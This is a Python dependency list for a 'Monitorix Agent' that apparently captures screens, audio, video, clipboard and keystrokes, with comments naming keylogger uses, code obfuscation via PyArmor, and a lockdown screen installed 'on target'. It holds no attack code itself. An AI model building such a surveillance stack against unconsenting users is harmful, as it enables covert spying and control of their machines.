# ============================================================
# Monitorix Agent — Python Requirements
# Install with: pip install -r requirements.txt
# Platform guards are enforced automatically by pip via
# the ; sys_platform conditions below.
# ============================================================

# ── Core Networking & Socket ──────────────────────────────────────────────────
requests==2.31.0
urllib3<2.0
python-socketio[client]==5.10.0
aiohttp>=3.9.0

# ── System Monitoring ─────────────────────────────────────────────────────────
psutil==5.9.8

# ── Screen Capture ────────────────────────────────────────────────────────────
mss==9.0.1
Pillow==10.2.0

# ── Audio / Video / WebRTC ────────────────────────────────────────────────────
aiortc==1.9.0
av==12.3.0
sounddevice==0.4.6
numpy<2.0.0

# ── Input Monitoring ─────────────────────────────────────────────────────────
pyperclip==1.8.2
pynput==1.7.6

# ── Cryptography ─────────────────────────────────────────────────────────────
cryptography==42.0.5

# ── Build & Packaging ─────────────────────────────────────────────────────────
pyinstaller>=6.3.0
pyarmor==8.5.8

# ── PyInstaller / pkg_resources helpers ──────────────────────────────────────
jaraco.classes
jaraco.stream
jaraco.text
jaraco.context
jaraco.functools
keyring
platformdirs

# ── Windows-only ─────────────────────────────────────────────────────────────
pywin32; sys_platform == "win32"
pypiwin32; sys_platform == "win32"
wmi; sys_platform == "win32"

# ── macOS-only ────────────────────────────────────────────────────────────────
# pyobjc-framework-Quartz provides screen capture & window APIs
pyobjc-framework-Quartz; sys_platform == "darwin"
pyobjc-framework-AppKit; sys_platform == "darwin"
pyobjc-framework-Foundation; sys_platform == "darwin"
pyobjc-core; sys_platform == "darwin"

# ── Linux-only ────────────────────────────────────────────────────────────────
# python-xlib: X11 display interaction (screenshots, window titles, keylogger)
python-xlib; sys_platform == "linux"
# evdev: raw input device access (uinput keylogger, mouse, USB events)
evdev; sys_platform == "linux"

# ── Note: Linux graphical lockdown screen ────────────────────────────────────
# zenity is a system package (not pip). Install on target with:
#   apt-get install -y zenity   (Debian/Ubuntu)
#   dnf install -y zenity       (Fedora/RHEL)
yara-python
